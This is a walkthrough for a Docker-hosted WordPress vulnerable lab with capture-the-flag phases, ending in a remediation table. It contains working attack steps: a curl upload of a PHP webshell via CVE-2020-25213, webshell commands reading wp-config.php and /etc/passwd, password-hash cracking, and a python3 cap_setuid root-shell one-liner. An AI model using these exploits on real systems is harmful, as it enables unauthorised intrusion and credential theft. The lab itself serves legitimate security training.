# HexaDynamics Vulnerable Lab — Complete Walkthrough

> **For authorized lab use only.** This walkthrough covers the full attack chain from reconnaissance to root. Each phase ends with a **FLAG** that students must submit.

---

## Lab Setup (Run Once)

```bash
# Clone/download the lab, then:
cd hexaexam
docker-compose up --build -d

# Wait ~60 seconds for full initialization, then verify:
docker-compose ps
docker logs hs_wp_web --tail 50
```

**Verify access:**
- Corporate site: http://localhost:8080
- WordPress intranet: http://localhost:8080/intranet
- SSH: `ssh marketing@localhost -p 2222`

---

## Flag Summary

| # | Phase | Flag | Where |
|---|-------|------|-------|
| 1 | Recon / Git Exposure | `FLAG{GIT_HISTORY_EXPOSED_creds_leaked}` | Git commit history |
| 2 | Authenticated RCE | `FLAG{RCE_WP_FILE_MANAGER_6_CVE_2020_25213}` | `/wp-content/uploads/.flag.txt` |
| 3 | Post-Exploitation | `FLAG{WP_CONFIG_DB_CREDS_EXPOSED}` | `wp-config.php` |
| 4 | Database Enumeration (WP) | `FLAG{DATABASE_ENUMERATION_wp_options}` | `wp_options` table |
| 5 | Database Enumeration (Custom) | `FLAG{DATABASE_DIRECT_ACCESS_hexa_internal}` | `hexa_internal_notes` table |
| 6 | SSH Credential Reuse | `FLAG{SSH_CREDENTIAL_REUSE_marketing_2026}` | `/home/marketing/flag.txt` |
| 7 | User Enumeration | `FLAG{ENUMERATION_devops_user_found}` | `/home/devops/flag.txt` |
| 8 | Privilege Escalation | `FLAG{ROOT_PRIVESC_python3_cap_setuid}` | `/root/flag.txt` |

---

## Phase 1 — Reconnaissance

### 1.1 Browse the Corporate Site

Open http://localhost:8080 in your browser.

- Note the company name: **HexaDynamics Pvt Ltd**
- Download the PDF brochure linked on the page
- Look for internal links, email addresses, subdomains mentioned

### 1.2 Directory Discovery

```bash
# Scan for common paths
dirb http://localhost:8080 /usr/share/dirb/wordlists/common.txt
# Or with gobuster:
gobuster dir -u http://localhost:8080 -w /usr/share/wordlists/dirb/common.txt
```

You will discover:
- `/.git/` — Exposed Git repository
- `/intranet/` — WordPress installation
- `/assets/docs/` — Public PDF documents

### 1.3 Port Scan

```bash
nmap -sV -p 80,22 localhost
# Port 80 (mapped to 8080) — Apache/WordPress
# Port 22 (mapped to 2222) — OpenSSH
```

---

## Phase 2 — Git Exposure & Credential Discovery

### 2.1 Confirm .git is Exposed

```bash
curl -s http://localhost:8080/.git/HEAD
# Output: ref: refs/heads/main (or master)
```

### 2.2 Dump the Git Repository

```bash
# Option A: Use git-dumper (recommended)
pip install git-dumper
git-dumper http://localhost:8080/.git/ ./dumped-repo

# Option B: Manual download and reconstruct
mkdir -p dumped-repo && cd dumped-repo
wget -r -np -nH http://localhost:8080/.git/
```

### 2.3 Extract Credentials from Git History

```bash
cd dumped-repo

# View commit history
git log --oneline
# You'll see something like:
#   abc1234 Cleaned up migration artifacts — removed temp creds
#   def5678 Added migration notes during infrastructure migration

# Show the file from the earlier commit (the one that ADDED the notes)
git log --all --oneline
git show <earlier-commit-hash>:migration_notes.txt
```

**Output will contain:**
```
Temporary WP admin creds for testing:
YWRtaW46U3VwZXJTZWNyZXRAMjAyNg==

FLAG{GIT_HISTORY_EXPOSED_creds_leaked}
```

### 2.4 Decode the Base64 Credentials

```bash
echo "YWRtaW46U3VwZXJTZWNyZXRAMjAyNg==" | base64 -d
# Output: admin:SuperSecret@2026
```

> **FLAG 1:** `FLAG{GIT_HISTORY_EXPOSED_creds_leaked}`

---

## Phase 3 — WordPress Admin Access & RCE via WP File Manager

### 3.1 Log into WordPress Admin

1. Go to http://localhost:8080/intranet/wp-admin/
2. Login with: `admin` / `SuperSecret@2026`
3. You now have full WordPress admin access

### 3.2 Identify the Vulnerable Plugin

1. Navigate to **Plugins** in the admin sidebar
2. You will see **WP File Manager** version 6.0 is installed and active
3. This version is vulnerable to **CVE-2020-25213** — unauthenticated arbitrary file upload

### 3.3 Exploit WP File Manager (CVE-2020-25213)

The vulnerable endpoint is at `/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php`

```bash
# Upload a PHP webshell via the vulnerable connector
# Create a simple command execution PHP file:
echo '<?php if(isset($_GET["cmd"])){system($_GET["cmd"]);} ?>' > shell.php

# Upload it using curl (CVE-2020-25213 — no auth required):
curl -s -F "reqid=1" \
     -F "cmd=upload" \
     -F "target=l1_Lw" \
     -F "upload[]=@shell.php" \
     "http://localhost:8080/intranet/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php"
```

### 3.4 Verify RCE

```bash
# Execute commands via the uploaded webshell
curl "http://localhost:8080/intranet/wp-content/plugins/wp-file-manager/lib/files/shell.php?cmd=id"
# Output: uid=33(www-data) gid=33(www-data) groups=33(www-data)

curl "http://localhost:8080/intranet/wp-content/plugins/wp-file-manager/lib/files/shell.php?cmd=whoami"
# Output: www-data
```

### 3.5 Find the RCE Flag

```bash
curl "http://localhost:8080/intranet/wp-content/plugins/wp-file-manager/lib/files/shell.php?cmd=cat+/var/www/html/intranet/wp-content/uploads/.flag.txt"
# Output: FLAG{RCE_WP_FILE_MANAGER_6_CVE_2020_25213}
```

> **FLAG 2:** `FLAG{RCE_WP_FILE_MANAGER_6_CVE_2020_25213}`

---

## Phase 4 — Post-Exploitation: Filesystem Discovery

### 4.1 Read wp-config.php

```bash
curl "http://localhost:8080/intranet/wp-content/plugins/wp-file-manager/lib/files/shell.php?cmd=cat+/var/www/html/intranet/wp-config.php"
```

**Key information extracted:**
```
DB_NAME:     wordpress
DB_USER:     wp_user
DB_PASSWORD: WpDb@2026!
DB_HOST:     db

/* FLAG{WP_CONFIG_DB_CREDS_EXPOSED} */
```

> **FLAG 3:** `FLAG{WP_CONFIG_DB_CREDS_EXPOSED}`

### 4.2 Enumerate Users from /etc/passwd

```bash
curl "http://localhost:8080/intranet/wp-content/plugins/wp-file-manager/lib/files/shell.php?cmd=cat+/etc/passwd" | grep -E "bash|sh$"
# Notable users:
#   root:x:0:0:root:/root:/bin/bash
#   marketing:x:1000:1000::/home/marketing:/bin/bash
#   devops:x:1001:1001::/home/devops:/bin/bash
```

### 4.3 Enumerate Home Directories

```bash
curl "http://localhost:8080/intranet/wp-content/plugins/wp-file-manager/lib/files/shell.php?cmd=ls+-la+/home/marketing/"
curl "http://localhost:8080/intranet/wp-content/plugins/wp-file-manager/lib/files/shell.php?cmd=ls+-la+/home/devops/"
```

### 4.4 Check for SUID Binaries and Capabilities

```bash
curl "http://localhost:8080/intranet/wp-content/plugins/wp-file-manager/lib/files/shell.php?cmd=getcap+-r+/usr+2>/dev/null"
# Output will show: /usr/bin/python3.x cap_setuid=ep
# This is your privilege escalation vector!
```

---

## Phase 5 — Database Enumeration

### 5.1 Connect to MySQL

```bash
# From the webshell (www-data can reach the DB container):
curl "http://localhost:8080/intranet/wp-content/plugins/wp-file-manager/lib/files/shell.php?cmd=mysql+-h+db+-u+wp_user+-p'WpDb@2026!'+wordpress+-e+'SHOW+TABLES;'"
```

Or use the mysql client directly from inside the container:
```bash
docker exec -it hs_wp_web mysql -h db -u wp_user -p'WpDb@2026!' wordpress
```

### 5.2 Extract WordPress Users and Password Hashes

```sql
SELECT ID, user_login, user_email, user_pass FROM wp_users;
```

**Output:**
```
+----+----------------+-------------------------------+------------------------------------+
| ID | user_login     | user_email                    | user_pass                          |
+----+----------------+-------------------------------+------------------------------------+
|  1 | admin          | admin@hexadynamics.local      | $P$B...  (phpass hash)             |
|  2 | marketing_user | marketing@hexadynamics.local  | $P$B...  (phpass hash)             |
+----+----------------+-------------------------------+------------------------------------+
```

### 5.3 Find the WP Options Flag

```sql
SELECT option_value FROM wp_options WHERE option_name = 'hexa_flag';
```

**Output:** `FLAG{DATABASE_ENUMERATION_wp_options}`

> **FLAG 4:** `FLAG{DATABASE_ENUMERATION_wp_options}`

### 5.4 Find the Hidden Table Flag

```sql
SHOW TABLES;
-- You'll see: hexa_internal_notes (non-WordPress table)

SELECT * FROM hexa_internal_notes;
```

**Output:**
```
+----+-------------------+------------------------------------------------------+
| id | note_title        | note_content                                         |
+----+-------------------+------------------------------------------------------+
|  1 | Migration Status  | WordPress migration from on-prem to Docker completed |
|  2 | DB Flag           | FLAG{DATABASE_DIRECT_ACCESS_hexa_internal}            |
|  3 | Backup Schedule   | Daily backups at 02:00 UTC to /backups/ directory    |
+----+-------------------+------------------------------------------------------+
```

> **FLAG 5:** `FLAG{DATABASE_DIRECT_ACCESS_hexa_internal}`

### 5.5 Crack the marketing_user Password (Optional)

```bash
# Save the hash to a file
echo 'marketing_user:$P$B...<hash>' > wp_hashes.txt

# Crack with hashcat or john
hashcat -m 400 wp_hashes.txt /usr/share/wordlists/rockyou.txt
# Or:
john --wordlist=/usr/share/wordlists/rockyou.txt wp_hashes.txt

# Result: Marketing@2026
```

---

## Phase 6 — SSH Credential Reuse

### 6.1 SSH as marketing User

The password `Marketing@2026` found via WP database/cracking matches the Linux `marketing` user.

```bash
ssh marketing@localhost -p 2222
# Password: Marketing@2026
```

### 6.2 Find the SSH Flag

```bash
marketing@hs_wp_web:~$ cat ~/flag.txt
FLAG{SSH_CREDENTIAL_REUSE_marketing_2026}

marketing@hs_wp_web:~$ ls ~/Documents/
# network-architecture-DRAFT.pdf  employee-directory.pdf
```

> **FLAG 6:** `FLAG{SSH_CREDENTIAL_REUSE_marketing_2026}`

### 6.3 Read the devops User Flag (if accessible)

```bash
marketing@hs_wp_web:~$ cat /home/devops/flag.txt
FLAG{ENUMERATION_devops_user_found}
```

> **FLAG 7:** `FLAG{ENUMERATION_devops_user_found}`

---

## Phase 7 — Privilege Escalation to Root

### 7.1 Enumerate Privilege Escalation Vectors

```bash
# Check sudo permissions
marketing@hs_wp_web:~$ sudo -l
# (likely no sudo access)

# Check SUID binaries
marketing@hs_wp_web:~$ find / -perm -4000 -type f 2>/dev/null

# Check Linux capabilities (THIS IS THE VECTOR)
marketing@hs_wp_web:~$ getcap -r /usr 2>/dev/null
# Output: /usr/bin/python3.11 cap_setuid=ep
```

### 7.2 Exploit Python3 cap_setuid Capability

Python3 has `cap_setuid=ep` set, which means it can change its UID to root (0).

```bash
marketing@hs_wp_web:~$ python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

You now have a **root shell**.

### 7.3 Capture the Root Flag

```bash
root@hs_wp_web:~# cat /root/flag.txt
FLAG{ROOT_PRIVESC_python3_cap_setuid}

root@hs_wp_web:~# whoami
root

root@hs_wp_web:~# id
uid=0(root) gid=1000(marketing) groups=1000(marketing)
```

> **FLAG 8:** `FLAG{ROOT_PRIVESC_python3_cap_setuid}`

---

## Summary of All Flags

```
FLAG 1: FLAG{GIT_HISTORY_EXPOSED_creds_leaked}         — Git history exposure
FLAG 2: FLAG{RCE_WP_FILE_MANAGER_6_CVE_2020_25213}     — WP File Manager RCE
FLAG 3: FLAG{WP_CONFIG_DB_CREDS_EXPOSED}                — wp-config.php credentials
FLAG 4: FLAG{DATABASE_ENUMERATION_wp_options}            — WordPress database
FLAG 5: FLAG{DATABASE_DIRECT_ACCESS_hexa_internal}       — Hidden database table
FLAG 6: FLAG{SSH_CREDENTIAL_REUSE_marketing_2026}        — SSH pivot
FLAG 7: FLAG{ENUMERATION_devops_user_found}              — User enumeration
FLAG 8: FLAG{ROOT_PRIVESC_python3_cap_setuid}            — Root via Python3 capability
```

---

## Attack Chain Diagram

```
Recon (port scan, dir brute) 
  → Discover /.git/ exposed
  → Dump git history → Decode base64 creds (admin:SuperSecret@2026)
  → WordPress admin login
  → WP File Manager 6.0 → CVE-2020-25213 → RCE as www-data
  → Read wp-config.php → DB creds
  → MySQL enumeration → user hashes + hidden flags  
  → Crack marketing_user password → SSH as marketing
  → getcap → Python3 cap_setuid → root shell
```

---

## Cleanup

```bash
# Stop and remove all lab containers and data
docker-compose down -v

# Remove built images (optional)
docker rmi hexaexam/wordpress:latest
```

---

## Remediation Notes (For Learning)

| Vulnerability | Fix |
|---|---|
| Exposed .git directory | Add `Deny from all` in `.htaccess` for `.git` or remove it |
| WP File Manager 6.0 (CVE-2020-25213) | Update to latest version or remove plugin |
| Credentials in Git history | Rotate all creds, use `git filter-branch` or BFG to purge |
| SSH password authentication | Use key-based auth, disable `PasswordAuthentication` |
| Credential reuse across services | Use unique passwords per service |
| Python3 with cap_setuid | Remove capability: `setcap -r /usr/bin/python3.11` |
| Database accessible from web | Network segmentation, restrict DB access |
| Hardcoded credentials in wp-config | Use environment variables, secrets management |
